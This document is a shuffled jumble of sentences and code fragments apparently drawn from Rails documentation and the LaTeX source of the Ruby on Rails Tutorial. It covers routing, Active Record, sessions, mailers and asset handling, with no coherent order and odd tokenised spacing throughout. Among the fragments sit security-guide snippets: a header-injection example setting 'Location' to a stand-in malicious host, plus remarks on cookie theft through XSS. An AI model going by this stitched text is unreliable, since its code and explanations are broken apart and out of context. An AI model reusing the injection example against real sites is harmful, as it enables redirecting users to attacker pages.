( Rails infers that \ kode { uniqueness } should be \ kode { true } as well ▖ )
* `autoplay : true` , starts playing the audio on page load
As noted in Section ~ \ ref { sec : strong _ parameters } , this is accomplished using \ emph { strong parameters } by calling \ kode { require } and \ kode { permit } on the \ kode { params } hash :
has _ many : customers , dependent : : destroy
Check out the section about cross-site scripting in the &#91; Security guide &#93; ( security ▖ html # cross-site-scripting-xss ) for further information about the risks .
Traditional methods for organizing CSS and JavaScript involve splitting functionality into separate files and using nice formatting ( with lots of indentation ) .
Finding and authenticating a user .
now - 1 ▖ week
Adding a micropost instance variable to the \ kode { home } action .
For more details on the kind of callbacks supported by Active Record , see the \ href { http : / / guides ▖ rubyonrails ▖ org / v3 ▖ 1 ▖ 23 / active _ record _ validations _ callbacks ▖ html } { discussion of callbacks at the Rails Guides } .
Consider the following loop for names :
&lt; % = render partial : &quot; product &quot; % &gt;
Now that we &apos;ve supplied the User model with the required \ kode { password \ _ digest } attribute and installed bcrypt , we &apos;re ready to add \ kode { has \ _ secure \ _ password } to the User model , as shown in Listing ~ \ ref { code : has _ secure _ password } .
&apos; &apos; Thanks to reader Riley Moses for pointing this out .
( This assumes you created the Heroku app in Section ~ \ ref { sec : planning _ the _ application } .
This is one reason why having a good test suite is so valuable .
Implement a search feature to remedy this .
On some systems , you may need to restart the Rails server at this point to keep the test suite \ passing .
Contents of the sample app &apos;s \ kode { config } directory .
Extensions to `Marshal`
# # # Path and URL Helpers
Git is incredibly good at making \ emph { branches } , which are effectively copies of a repository where we can make ( possibly experimental ) changes without modifying the parent files .
Does the same as `create _ association` above , but raises `ActiveRecord : : RecordInvalid` if the record is invalid .
# # # Prefixing the Named Route Helpers
# # # `unscope`
Ruby versions 1 ▖ 9 and later actually guarantee that hashes keep their elements in the same order entered , but it would be unwise ever to count on a particular ordering .
This gem uses Ajax to speed up page rendering in most applications .
Since the encrypted \ kode { SecureRandom ▖ urlsafe \ _ base64 } string is definitely \ emph { not } blank , the tests for the User model should now be passing :
# # # # # `collection ▖ destroy ( object , ▖ ▖ ▖ )
Since we &apos;ll be testing password mismatch in a moment , here we make sure to test the \ emph { presence } validation by setting both the password and its confirmation to a blank string .
For `belongs _ to` associations you need to create foreign keys , and for `has _ and _ belongs _ to _ many` associations you need to create the appropriate join table .
Now , Active Model Serializers and Active Record objects have the same default behavior ▖
With Active Job you can schedule ╼ the job to run on a specific queue :
With a random subdomain like this , someone could visit your site only if you gave them the address .
* `config ▖ action _ controller ▖ action _ on _ unpermitted _ parameters` enables logging or raising an exception if parameters that are not explicitly permitted are found ▖
The resulting Home page appears in Figure ~ \ ref { fig : home _ page _ follow _ stats } .
See its documentation for full ╼ details .
The initial index page for the Users resource ( \ href { http : / / localhost : 3000 / users } { / users } ) .
Because its meaning is a little clearer , we &apos;ll prefer this second comparison form in the application code .
We deployed our application to a production environment using Heroku .
As it presently stands , the sample application forms a solid foundation for any website requiring users with authentication and authorization .
Because the message is also inserted into the template , the full HTML result for
resources : photos , except : : destroy
create _ table : employees do &#124; t &#124;
class C
Fixing this blemish is the task of Section ~ \ ref { sec : a _ flash _ test } .
The actual HTML generated by this ERb isn &apos;t particularly relevant , but you might be curious , so here &apos;s a peek :
Common Validation Options
The full implementation appears in Listing ~ \ ref { code : relationships _ controller } .
&lt; h1 &gt; Books are coming soon !
# ▖ ▖ .
Below are just a few of the many possibilities .
Unfortunately , there &apos;s still a terrible security hole : any sufficiently sophisticated attacker could simply issue \ texttt { DELETE } requests directly from the command line to delete any user on the site .
We need a way to make a token available via \ kode { user ▖ remember \ _ token } ( for storage in the cookies ) \ emph { without } storing it in the database .
We can now check our database just to double-check that the new user was actually created :
Unless you explicitly use the `helpers _ path` parameter , this change will only impact the way of loading helpers from engines ▖
in Listing ~ \ ref { code : initial _ failing _ signin _ test } and
ohtTEcH ▖ ▖ ▖ &quot; &gt; ╼ \ end { code } ╼ ╼ \ subsection { What we learned in this chapter } % ( fold ) ╼ \ label { sec : modeling _ users _ what _ we _ learned _ in _ this _ chapter } ╼ ╼ \ begin { itemize } ╼ \ item
The comment indicates that the code in the \ kode { before } block is not idiomatically correct .
By writing a test and running RSpec at each step , we &apos;ll see how TDD can guide us through the development of our application code .
does exactly the same thing for microposts .
Sent mail to michael @ michaelhartl ▖ com ( 66 ▖ 8ms ) ╼ Date : Thu , 04 Sep 2014 01 : 04 : 59 + 0000 ╼ From : noreply @ example ▖ com ╼ To : michael @ michaelhartl ▖ com ╼ Message-ID : &lt; 5407babbee139 _ 8722b257d04576a @ mhartl-rails-tutorial-953753 ▖ mail &gt; ╼ Subject : Password reset ╼ Mime-Version : 1 ▖ 0 ╼ Content-Type : multipart / alternative ; ╼ boundary = &quot; -- = = _ mimepart _ 5407babbe3505 _ 8722b257d045617 &quot; ; ╼ charset = UTF-8 ╼ Content-Transfer-Encoding : 7bit ╼ ╼ ╼ ---- = = _ mimepart _ 5407babbe3505 _ 8722b257d045617 ╼ Content-Type : text / plain ; ╼ charset = UTF-8 ╼ Content-Transfer-Encoding : 7bit ╼ ╼ To reset your password click the link below : ╼ ╼ http : / / rails-tutorial-c9-mhartl ▖ c9 ▖ io / password _ resets / 3BdBrXeQZSWqFIDRN8cxHA / ╼ edit ?
The Rails router recognizes URLs and dispatches them to a controller &apos;s action ▖
Resources
The site layout with a footer partial .
Adding CSS for the site logo .
&#124; GET &#124; / kategorien &#124; categories # index &#124; categories _ path &#124;
# Generates a select field from 1900 to 2009 that defaults to the current year
The `new` method will return a new ╼ object while `create` will return the object and save it to the database .
t ▖ references : publication _ type
This will find all clients who have orders that were created yesterday , again using a `BETWEEN` SQL expression .
In order to get the files to appear , you may need to click the gear icon in the file navigator area and select ``Refresh File Tree &apos; &apos; ▖ )
In some circumstances you may wish to use live compilation ▖
before _ save : set _ author
At this point , the signup form is working , at least in the sense that it no longer produces an error upon submission .
If you &apos;re following along with version control , make a topic branch as usual :
http _ basic _ authenticate _ with name : &quot; dhh &quot; , password : &quot; secret &quot; , only : : destroy
&lt; li &gt; ` : password` - If your mail server requires authentication , set the password in this setting ▖ &lt; / li &gt;
With debug mode turned off the manifest above would ╼ generate instead :
# # # # Entire Rails :
Now that the ``remember &apos; &apos; branch of \ kode { current \ _ user } is tested , we can be confident of catching regressions without having to check by hand .
In Listing ~ \ ref { code : example _ user } , we did this with Ruby &apos;s \ kode { attr \ _ accessor } method :
The actual implementation in Active Record is not straight `tableize` indeed , because it also demodulizes the class name and checks a few options that may affect the returned string .
As a result , validating images requires defining a custom validation , which we &apos;ll call \ kode { picture \ _ size } and define as shown in Listing ~ \ ref { code : micropost _ model _ image _ validation } .
` : constraints` takes regular expressions with the restriction that regexp anchors can &apos;t be used ▖
Rails application and engine developers should put these assets in `app / assets` or configure `config ▖ assets ▖ precompile` .
Add these settings if you enable the asset pipeline :
You should also check that the tests pass :
&lt; % = yield : head % &gt;
Section ~ \ ref { sec : showing _ users } will develop the user index into a more polished page for showing all users .
An example would be adding the following to your appropriate ╼ `config / environments / $ RAILS _ ENV ▖ rb` file :
Remember : the `Article` model is namespaced , so to ╼ reference it you must call it as `Blorgh : : Article` .
beginning _ of _ quarter ( at _ beginning _ of _ quarter )
You can do this in an initializer file ╼ `config / initializers / sandbox _ email _ interceptor ▖ rb`
/ * mixins , variables , etc ▖ * /
In our case , the toy app will be a microblog , with only users and short ( micro ) posts .
Start Spork in a terminal window .
Don &apos;t forget to run `bundle install` as usual ▖
The first subtlety is that , even though the ``Log out &apos; &apos; link appears only when logged-in , a user could potentially have multiple browser windows open to the site .
= &gt; &#91; # &lt; Micropost id : 1 , content : &quot; First micropost ! &quot; , user _ id : 1 , created _ at :
Rails provides a `resources` method which can be used to declare a standard REST ╼ resource ▖
password _ digest : &quot; $ 2a $ 10 $ kn4cQDJTzV76ZgDxOWk6Je9A0Ttn5sKNaGTEmT0jU7 ▖ n ▖ ▖ ▖ &quot;
After running the migration , you should be able to use the toy app in production , with a real PostgreSQL database back-end ( Figure ~ \ ref { fig : toy _ app _ production } ) .
As a final step in handling failed user creation , we &apos;ll add helpful error messages to indicate the problems that prevented successful registration .
# # # # # Layout Inheritance
There &apos;s a minor complication , though : by default Git tracks the changes of \ emph { all } the files , but there are some files we don &apos;t want to track .
Location : http : / / www ▖ malicious ▖ tld
╼ This is the home page for the
But there are several mysteries .
git commit : % Q { -m &apos; Initial commit &apos; }
&lt; meta content = &apos; text / html ; charset = UTF-8 &apos; http-equiv = &apos; Content-Type &apos; / &gt;
Using the generalized \ kode { authenticated ? }
We also want to allow only authenticated users to delete comments , so in the ╼ `CommentsController` ( `app / controllers / comments _ controller ▖ rb` ) we write :
For example , to store users with names and email addresses , we &apos;ll create a \ kode { users } table with \ kode { name } and \ kode { email } columns ( with each row corresponding to one user ) .
INFO : `beginning _ of _ hour` , `end _ of _ hour` , `beginning _ of _ minute` and `end _ of _ minute` are implemented for `Time` and `DateTime` but * * not * * `Date` as it does not make sense to request the beginning or end of an hour or minute on a `Date` instance .
Note that layouts for partials follow the same leading-underscore naming as regular partials , and are placed in the same folder with the partial that they belong to ( not in the master `layouts` folder ) .
Note also that we have added a test to verify that the admin does not see a link to delete himself .
Because of Unobtrusive JavaScript , the Rails &quot; Ajax helpers &quot; are actually in two ╼ parts : the JavaScript half and the Ruby half .
Default rendering is an excellent example of this ▖
* Sets an X-Runtime header , containing the time ( in seconds ) taken to execute the request .
Set to false in development mode , true in production .
In addition , the table for the ╼ model is namespaced , becoming `blorgh _ articles` , rather than simply `articles` ▖ ╼
This involves opening the \ kode { Gemfile } with your favorite text editor :
# do some magic ▖ .
Which service you use for a particular repo thus depends on your specific needs .
We then edit the resulting \ kode { Guardfile } so that Guard will run the right tests when the integration tests and views are updated ( Listing ~ \ ref { code : guardfile } ) .
&quot; Oh dear ! Oh dear !
@ open _ orders = @ customer ▖ orders ▖ find ( 1 )
= &gt; &#91; 17 , 42 , 8 &#93;
( Note that , in contrast to the plural convention for controller names , model names are singular : a Users controller , but a User model ▖ )
* `after _ enqueue`
Also note that the session deletion occurs even though the line with the redirect appears first ; redirects don &apos;t happen until an explicit \ kode { return } or the end of the method , so any code appearing after the redirect is still executed .
In comparison , note that the `ordinal` method returns * * only * * the suffix string .
1 ) # = &gt; true
before _ save { return false } # BAD
resources : photos , as : &apos; images&apos;
original _ process ( action , params , session , flash , http _ method )
Each of these two features will involve creating a new resource , thereby giving us a chance to see further examples of controllers , routing , and database migrations .
This works because the \ kode { microposts } table has a \ kode { user \ _ id } attribute to identify the user ( Section ~ \ ref { sec : the _ basic _ model } ) .
You can see the final result in Figure ~ \ ref { fig : site _ with _ footer } .
The \ kode { index } action asks the User model to retrieve all users ( \ kode { User ▖ all } ) .
When &quot; true &quot; and &quot; false &quot; are English words rather than Ruby keywords use a regular font :
Here the rule
This module provides methods for generating HTML that links views to assets such as images , JavaScript files , stylesheets , and feeds .
Each action needs to set a title , find the user , retrieve either \ kode { @ user ▖ followed \ _ users } or \ kode { @ user ▖ followers } ( in paginated form ) , and then render the page .
If your application is currently on any version of Rails older than 3 ▖ 0 ▖ x , you should upgrade to Rails 3 ▖ 0 before attempting an update to Rails 3 ▖ 1 .
Be careful because this also means you &apos;re initializing a model object with only the fields that you &apos;ve selected ▖
person = Person ▖ create ( name : &quot; !
Active Model
item ▖ with _ lock do
Making Your Library or Gem a Pre-Processor
This section uses count as an example method in this preamble , but the options described apply to all sub-sections .
Routing Concerns allows you to declare common routes that can be reused inside other resources and routes ▖
&quot; X &quot; ▖ constantize # = &gt; : in _ Object ( ! )
In Listing ~ \ ref { code : layout _ with _ partials } , we &apos;ve replaced the HTML shim stylesheet lines with a single call to a Rails helper called \ kode { render } :
Here is a quick explanation of the items presented in the preceding method ▖
with the SQL snippet
t ▖ belongs _ to : part
In order to include the email as well , we need to use a \ emph { query parameter } , which in a URL appears as a key-value pair located after a question mark
Instance-level `respond _ to` is unaffected and does not require the additional gem :
RESTful routes provided by the Users resource in Listing ~ \ ref { code : rails _ routes } .
# # # # Using Partials to Simplify Views
# Make sure the micropost doesn &apos;t appear in the database .
Note from Table ~ \ ref { table : demo _ RESTful _ users } that there is some overlap in the URLs ; for example , both the user \ kode { show } action and the \ kode { update } action correspond to the URL / users / 1 .
The default query string in Rails 2 ▖ x is based on the modification time of ╼ the files ▖
Those users couldn &apos;t even sign up ; now users can sign up , sign in , sign out , view their profiles , edit their settings , and see an index of all users---and some can even destroy other users .
unless token ▖ blank ?
def article _ params
Underlying this method is a powerful \ emph { inflector } that knows how to pluralize a large number of words , including many with irregular plurals :
Note that if any of the validations fail , such as when a password is required to save a record ( as implemented in Section ~ \ ref { sec : adding _ a _ secure _ password } ) , the call to \ kode { update \ _ attributes } will fail .
Furthermore , unlike `select` and other `Relation` scopes , `pluck` triggers an immediate ╼ query , and thus cannot be chained with any further scopes , although it can work with ╼ scopes already constructed earlier :
There is also a shorthand for this ▖
( We &apos;ll put the \ kode { created \ _ at } column to work in Section ~ \ ref { sec : ordering _ and _ dependency } and Section ~ \ ref { sec : rendering _ microposts } ▖ )
In the next chapter , we &apos;ll build on the foundation from Chapter ~ \ ref { cha : beginning } to make a database-backed \ emph { toy app } , which will give us our first real taste of what Rails can do .
TIP : It &apos;s possible to use any of the above middlewares in your custom Rack stack .
config ▖ assets ▖ configure do &#124; env &#124;
* `preload`
Unfortunately , this can be confusing , especially since \ kode { : name } is valid on its own ( as a standalone symbol ) but \ kode { name : } has no meaning by itself .
belongs _ to : author , class _ name : Blorgh ▖ author _ class
( We could eliminate some duplication by putting the test login in the \ kode { setup } method of Listing ~ \ ref { code : edit _ tests _ logged _ in } , but in Section ~ \ ref { sec : friendly _ forwarding } we &apos;ll change one of the tests to visit the edit page \ emph { before } logging in , which isn &apos;t possible if the login step happens during the test setup ▖ )
By default , this is `false` : associated objects will not be validated when this object is saved .
Throughout the rest of this book , I will thus often include \ emph { mockups } ( in a web context often called \ emph { wireframes } ) , which are rough sketches of what the eventual application will look like
In addition , after an invalid submission Rails automatically wraps the fields with errors in \ kode { div } s with the CSS class \ kode { field \ _ with \ _ errors } .
Client ▖ order ( &quot; orders _ count ASC &quot; , &quot; created _ at DESC &quot; )
If you now click on either the ~ \ href { http : / / localhost : 3000 / users ? page = 2 } { 2 } link or \ href { http : / / localhost : 3000 / users ? page = 2 } { Next } link , you &apos;ll get the second page of results , as shown in Figure ~ \ ref { fig : user _ index _ page _ two _ rails _ 3 } .
The login form after trying to access a protected page .
The functionality will be utterly under-developed , and many of the steps will seem like magic , but worry not : the full sample app will develop a similar application from the ground up starting in Chapter ~ \ ref { cha : static _ pages } , and I will provide plentiful forward-references to later material .
Ruby is setting the \ kode { @ name } variable to \ kode { &quot; Example User &quot; } ( and similarly for the \ kode { email } attribute ) , which we then use in the \ kode { formatted \ _ email } method .
in Listing ~ \ ref { code : account _ activation _ view _ text } and
The \ kode { store \ _ location } method in Listing ~ \ ref { code : friendly _ forwarding _ code } puts the requested URL in the \ kode { session } variable under the key \ kode { : forwarding \ _ url } , but only for a \ kode { GET } request .
* How to contribute to the Ruby on Rails code .
When we last saw our new application , we had just updated our mostly static pages to use Rails layouts to eliminate duplication in our views , as shown in Listing ~ \ ref { code : application _ layout _ redux } ( which is the same as Listing ~ \ ref { code : application _ layout } ) .
Preprocessor engines
If a `before _ add` callback throws an exception , the object does not get added to the collection ▖
def notify ( user , ▖ ▖ ▖ )
To get this to work , we need to define the \ kode { password _ reset _ expired ? }
Unless otherwise noted , you should use the exact versions of all software used in the tutorial , including Rails itself , if you want the same results .
You now need to create the `create` action within the `ArticlesController` for ╼ this to work .
For most UNIX-like systems including Mac OS X this will be a ╼ dollar sign ` $ ` ▖
person = Person ▖ new
As with the User class in Section ~ \ ref { sec : a _ user _ class } , instances of the User model allow access to their attributes using a dot notation :
The following methods are reimplemented so you do * * not * * need to load `active _ support / core _ ext / date / calculations ▖ rb` for these ones :
Working with Validation Errors
WARNING : Using ` + ▖ ▖ ▖ + ` for fixed-width font only works with simple content like ╼ ordinary method names , symbols , paths ( with forward slashes ) , etc ▖
* `after _ perform`
Although web apps are ultimately about strings , actually \ emph { making } those strings requires using other data structures as well .
Write a test to make sure delete links do not appear for microposts not created by the current user .
Applying the basic HTML structure from Listing ~ \ ref { code : html _ structure } to the custom Home page from Listing ~ \ ref { code : custom _ home _ page } yields Listing ~ \ ref { code : home _ view _ full _ html } .
Working with JavaScript in Rails
The `parent _ name` method on a nested named module returns the fully-qualified name of the module that contains its corresponding constant :
# # # Header Injection
now ▖ change ( year : 2011 , offset : Rational ( -6 , 24 ) )
╼ ╼ % subsection a _ working _ form ( end ) ╼ ╼ \ subsection { Strong parameters } % ( fold ) ╼ \ label { sec : strong _ parameters } ╼ ╼
Code for the About page ▖
Add the new remote to your local repository on your local machine :
route get &quot; static _ pages / help &quot;
* `Rack : : Sendfile` intercepts responses whose body is being served from a file and replaces it with a server specific X-Sendfile header ▖
They can also be accessed and overridden at the instance level .
To go all the way back to the beginning , we can use
We can fix this by using events instead ▖
validates : legacy _ code , format : { with : / \ A &#91; a-zA-Z &#93; + \ z / ,
# root &apos; welcome # index&apos;
Unfortunately , experience shows that even minor point releases can break things , so for the \ emph { Ruby on Rails Tutorial } we &apos;ll err on the side of caution by including exact version numbers for all gems .
We got a glimpse of controllers in Chapter ~ \ ref { cha : a _ toy _ app } , and will come to a deeper understanding once we explore the \ href { http : / / en ▖ wikipedia ▖ org / wiki / Representational _ State _ Transfer } { REST architecture } more fully ( starting in Chapter ~ \ ref { cha : modeling _ users } ) .
&lt; title &gt; A simple page &lt; / title &gt;
The signup form submitted with invalid information .
If you want to assign an object to a `has _ one` association without saving the object , use the `association ▖ build` method .
* `config ▖ active _ record ▖ schema _ migrations _ table _ name` lets you set a string to be used as the name of the schema migrations table .
If you deploy using a shared host or a dedicated server , I suggest using \ href { http : / / freelancing-god ▖ github ▖ com / ts / en / } { Thinking Sphinx } ( following the \ href { http : / / railscasts ▖ com / episodes / 120-thinking-sphinx } { RailsCast on Thinking Sphinx } ) .
In general , CSS rules refer either to a class , an id , an HTML tag , or some combination thereof , followed by a list of styling commands .
Set-Cookie : _ blog _ session = ▖ ▖ ▖ snip ▖ ▖ ▖ ; path = / ; HttpOnly
* Rails 4 ▖ 0 also changed the way unicode character routes are drawn ▖
Note that the id does not need to be specified in the route helper .
# # # Advanced Constraints
The Microposts controller itself appears in schematic form Listing ~ \ ref { code : demo _ microposts _ controller } .
Don &apos;t worry about exactly how the \ kode { t } ~ object manages to do this ; the beauty of \ emph { abstraction layers } is that we don &apos;t have to know .
# # # Grouping Conditional validations
A mockup of a profile page with microposts .
from Listing ~ \ ref { code : basic _ signup _ tests } to
d ▖ advance ( years : 1 , months : 1 , days : 1 , hours : 1 , minutes : 1 , seconds : 1 )
&lt; li &gt; ` : sendmail` , can be configured by using `config ▖ action _ mailer ▖ sendmail _ settings` ▖ &lt; / li &gt;
With the `new` method defined in `ArticlesController` , if you refresh ╼ &lt; http : / / localhost : 3000 / articles / new &gt; you &apos;ll see another error :
&lt; % = f ▖ label : author _ name % &gt; &lt; br &gt;
&#91; &#93; ▖ sum # = &gt; 0
* `test _ framework` defines which test framework to use ▖
Right now \ emph { all } users are displayed on the user index page at / users and are visible via the URL / users / : id , but it makes sense to show users only if they are activated .
Because we &apos;ll be using an \ kode { edit } action , we could include \ kode { edit } on the command line , but this would also generate both an edit view and a test , neither of which we &apos;ll turn out to need .
Before writing any code , let &apos;s mock up the expected sequence for resetting passwords .
&#124; GET &#124; / comments / : id ( ▖ : format ) &#124; comments # show &#124; sekret _ comment _ path &#124;
On my system , I had to install the following ( using \ href { http : / / mxcl ▖ github ▖ com / homebrew / } { Homebrew } , a package management system for OS ~ X ) :
Can be set to `nil` for no logging ▖
ise &apos; id = &apos; ex-ad9fd0 &apos; &gt; &lt; / span &gt; ╼ ╼ \ end { enumerate } ╼ ╼ ╼ % subsection signup _ error _ messages ( end ) ╼ ╼ ╼ \ subsection { A test for invalid submission } % ( fold ) ╼ \ label { sec : a _ test _ for _ invalid _ submission } ╼ ╼
# = &gt; Mon , 09 Aug 2010 23 : 20 : 05 UTC + 00 : 00
For example , if you &apos;re running code in an `AdminProductsController` that lives in `app / controllers / admin` , you can render the results of an action to a template in `app / views / products` this way :
uctor using the \ kode { Range } class and the \ kode { new } method ? \ emph { Hint } : \ kode { new } takes two arguments in this context ▖ ╼ % = &lt; span class = &apos; exercise &apos; id = &apos; ex-73158e &apos; &gt; &lt; / span &gt; ╼ ╼ \ item Confirm using the \ kode { = = } operator that the literal and named constructors from the previous two exercises are identical ▖ ╼ % = &lt; span class = &apos; exercise &apos; id = &apos; ex-4d8c3d &apos; &gt; &lt; / span &gt; ╼ ╼ \ end { enumerate } ╼ ╼ % subsection constructors ( end ) ╼ ╼ \ subsection { Class inheritance } % ( fold ) ╼ \ label { sec : a _ class _ of _ our _ own } ╼ ╼
Article ▖ none # returns an empty Relation and fires no queries .
In Rails , this can be accomplished with \ texttt { rails destroy } followed by the name of the generated element .
Lots of little benefits really add up .
Ruby has its own idiosyncrasies , so those will likely be new , too .
The method `extract ! ` removes and returns the key / value pairs matching the given keys .
# # # Templates
To store the user &apos;s id in the cookies , we could follow the pattern used with the \ kode { session } method ( Listing ~ \ ref { code : log _ in _ function } ) using something like
We can commit the resulting change as follows :
On each page , the application could simply call
&lt; % if pages ▖ many ?
NOTE : The actual rendering is done by subclasses of `ActionView : : TemplateHandlers` ▖
These changes will ensure that all articles have a title that is at least five ╼ characters long ▖
This means that we have to create a new \ kode { app / views / shared } directory using \ kode { mkdir } ( Table ~ \ ref { table : unix _ commands } ) :
If a value isn &apos;t set for `config ▖ active _ support ▖ deprecation` then this initializer will prompt the user to configure this line in the current environment &apos;s `config / environments` file ▖
in Listing ~ \ ref { code : user _ pages _ spec } and
If the application does not use the asset pipeline , to include the jQuery JavaScript library in your application , pass ` : defaults` as the source ▖
In order to have account activation mean something , we need to allow users to log in only if they are activated .
# = &gt; ActiveRecord : : RecordInvalid : Validation failed : Name can &apos;t be blank
In this case , the host application doesn &apos;t ╼ need to require `admin ▖ css` or `admin ▖ js` ▖
( Thanks to reader \ href { http : / / getsatisfaction ▖ com / railstutorial / topics / adding _ methods _ to _ built _ in _ classes _ comparable _ to _ using _ javascripts _ prototype _ object } { Erik Eldridge } for pointing this out ▖ )
# # # FormOptionsHelper
# = &gt; &#91; &quot; I am David &quot; , &quot; I am Jeremy &quot; , &quot; I am Jose &quot; &#93;
Being able to sign up users is a major milestone for our application .
( end ) ╼ ╼ \ subsection { Creating and authenticating a user } % ( fold ) ╼ \ label { sec : creating _ and _ authenticating _ a _ user } ╼ ╼
Oh ▖ ▖ ▖ &quot;
&lt; % = raw @ cms ▖ current _ template % &gt; &lt; % # inserts @ cms ▖ current _ template as is % &gt;
Returns `select` and `option` tags for the collection of existing return values of `method` for `object` &apos; s class .
When your Rails application receives an incoming request for :
alias _ method : process , : process _ with _ stringified _ params
If we were to add , say , an \ kode { index } action accessible even to non-signed-in users , we would need to specify the protected actions explicitly :
# # # # # `beginning _ of _ month` , `end _ of _ month`
next _ month
Once you &apos;ve placed the contents of Listing ~ \ ref { code : gemfile _ sqlite _ version } into the application &apos;s \ kode { Gemfile } , install the gems using \ kode { bundle install }
Otherwise , the value received as argument , which defaults to `nil` , is the separator :
As before , we &apos;ll use \ kode { generate } to make the simplest controller that meets our present needs , namely , one with a stub signup page for new users .
&lt; / pre &gt;
This hash gets passed to the Users controller as part of \ kode { params } , and we saw starting in Section ~ \ ref { sec : a _ users _ resource } that the \ kode { params } hash contains information about each request ▖ In the case of a URL like / users / 1 , the value of \ kode { params &#91; : id &#93; } is the \ kode { id } of the corresponding user ( \ kode { 1 } ~ in this example ) .
# # # `exclude ?
Client ▖ where ( &quot; orders _ count &gt; 10 &quot; ) ▖ reverse _ order
# = &gt; Thu , 05 Aug 2010 11 : 33 : 31 + 0000
{ a : 1 , b : 2 } ▖ except ( : a ) # = &gt; { : b = &gt; 2 }
* How to interpret the code in `routes ▖ rb` .
transform _ keys { &#124; key &#124; key ▖ to _ sym rescue key }
Last name : &lt; % = person _ form ▖ text _ field : last _ name % &gt;
This step is necessary only if you &apos;ve changed the version of the Rails gem , which would likely happen only if you &apos;re using Rails Installer , but it does no harm to run it in other cases as well .
Setting Cloud9 to use two spaces for indentation .
# # # # Using `render` with ` : inline`
Sprockets also sets the `Cache-Control` HTTP header to `max-age = 31536000` ▖
As with ordinary views , we can use embedded Ruby to customize the template views , in this case greeting the user by name and including a link to a custom activation link .
The `first` method finds the first record ordered by the primary key ▖
Then you make the `app / views / articles / show ▖ html ▖ erb` look like the following :
# &lt; contributors &gt;
If we only need to update a single attribute , using the singular \ kode { update \ _ attribute } bypasses this restriction :
Using idiomatically correct code to build a micropost ▖
Setting \ kode { @ current \ _ user } to \ kode { nil } would only matter if \ kode { @ current \ _ user } were created before the \ kode { destroy } action ( which it isn &apos;t ) \ emph { and } if we didn &apos;t issue an immediate redirect ( which we do ) .
The following table explains the usage of the loaded middlewares :
For more details , including other events you can bind to , check out &#91; the ╼ Turbolinks ╼ README &#93; ( https : / / github ▖ com / rails / turbolinks / blob / master / README ▖ md ) .
As discussed in Section ~ \ ref { sec : a _ hashed _ password } , the password digest is created using bcrypt ( via \ kode { has \ _ secure \ _ password } ) , so we &apos;ll need to create the fixture password using the same method .
It &apos;s odd to create a new class just to create a method that takes a string as an argument .
# = &gt; Mon Oct 18 00 : 00 : 00 UTC 1582
Renders a container tag that relates to your Active Record Object .
Implementing sessions will involve defining a large number of related functions for use across multiple controllers and views .
Comparing Listing ~ \ ref { code : demo _ users _ controller _ class } and Listing ~ \ ref { code : demo _ microposts _ controller _ class } , we see that both the Users controller and the Microposts controller inherit from the Application controller .
Disallowing double dots in email domain names ▖
With jQuery , you &apos;d write something like this :
We &apos;ll see in just a moment the benefits of adding \ kode { has \ _ secure \ _ password } to the User model ( Section ~ \ ref { sec : creating _ and _ authenticating _ a _ user } ) , but first we &apos;ll add a minimal requirement on password security .
If you append onto a safe string , either in-place with `concat` / ` &lt; &lt; ` , or with ` + ` , the result is a safe string ▖
Happily , this problem has already been solved : in Section ~ \ ref { sec : creating _ and _ authenticating _ a _ user } , we created a User record by hand using the Rails console , so there should be one user in the database :
Active Record supplies a great deal of functionality to ╼ your Rails models for free , including basic database CRUD ( Create , Read , Update , ╼ Destroy ) operations , data validation , as well as sophisticated search support ╼ and the ability to relate multiple models to one another .
A user is logged in if there is a current user in the session , i ▖ e ▖ , if \ kode { current \ _ user } is not \ kode { nil } .
Rails passes the object being added or removed to the callback .
The ` : source _ type` option specifies the source association type for a `has _ one : through` association that proceeds through a polymorphic association .
A diagram of this hierarchy appears in Figure ~ \ ref { fig : static _ pages _ controller _ inheritance } .
# return the first user named David
Since this will involve a minor refactoring , in this section we &apos;ll write a test to catch any future regressions .
AND locked = ? &quot; , params &#91; : orders &#93; , false )
This is the home page for the
def change
For example , if you take a look back at Figure ~ \ ref { fig : cloud9 _ gemfile } , you &apos;ll see a small vertical line on the right to help keep code under 80 characters .
Exceptions
# # # # password _ field _ tag
The reason is that , as noted in Section ~ \ ref { sec : a _ hashed _ password } , \ kode { has \ _ secure \ _ password } enforces validations on the virtual \ kode { password } and \ kode { password \ _ confirmation } attributes , but the tests in Listing ~ \ ref { code : validates _ uniqueness _ of _ email _ case _ insensitive _ test } create an \ kode { @ user } variable without these attributes :
/ photos / 1 / change
validates : name , : login , : email , absence : true
# Ruby on Rails Tutorial : sample application ╼ ╼ This is the sample application for the ╼ &#91; * Ruby on Rails Tutorial : ╼ Learn Web Development with Rails * &#93; ( http : / / www ▖ railstutorial ▖ org / ) ╼ by &#91; Michael Hartl &#93; ( http : / / www ▖ michaelhartl ▖ com / ) .
For example , the Users controller &apos;s \ kode { create } action defines an \ kode { @ user } variable ( Listing ~ \ ref { code : user _ signup _ with _ account _ activation } ) , so we can access it in the test using \ kode { assigns ( : user ) } .
This distinction won &apos;t be important in this chapter , but we &apos;ll learn more about environments in Section ~ \ ref { sec : rails _ environments } .
( Listing ~ \ ref { code : full _ title _ helper _ tests } uses \ kode { assert \ _ equal &lt; expected &gt; , &lt; actual &gt; } , which verifies that the expected result \ linebreak matches the actual value when compared with the \ kode { = = } operator ▖ )
Within the `customer` partial , the `customer` variable will refer to ` @ new _ customer` from the parent view .
* `after _ add`
in Listing ~ \ ref { code : respond _ to _ password _ digest } .
As usual , we &apos;ll write tests as we develop , extending the theme of using RSpec and Capybara to write succinct and expressive integration tests .
The `head` method can be used to send responses with only headers to the browser ▖
Just like the ` : status` option for `render` , ` : status` for `redirect _ to` accepts both numeric and symbolic header designations .
A test for showing microposts on the user \ kode { show } page .
file _ field ( : user , : avatar )
&gt; puts ENV &#91; &apos; DATABASE _ URL &apos; &#93;
resources : photos , : books , : videos
in the feature file gets handled by the step definition
Using a ╼ `return` statement in an inline callback block causes a `LocalJumpError` to ╼ be raised when the callback is executed .
root &apos; welcome # index&apos;
* `has _ one`
orders ▖ empty ?
Instead of \ kode { = = } , this uses the boolean method \ kode { is \ _ password ? } \ to perform the comparison .
as seen in Listing ~ \ ref { code : relationships _ resource } .
If you &apos;ve been tailing the development log , you may have noticed that no new lines have shown up yet .
A typical application might have a `User` class that would be used to represent ╼ authors for an article or a comment ▖
Because we won &apos;t need fixtures until Chapter ~ \ ref { cha : basic _ login } , for now we &apos;ll just remove them , leaving an empty fixtures file ( Listing ~ \ ref { code : empty _ fixtures } ) .
If this class contains the foreign key , then you should use `belongs _ to` instead .
You may have noticed some repetition in the Static Pages controller test ( Listing ~ \ ref { code : title _ tests } ) .
= &gt; AbstractController : : Base
For an attacker , of course , this is not useful , as the victim will see their own cookie ▖
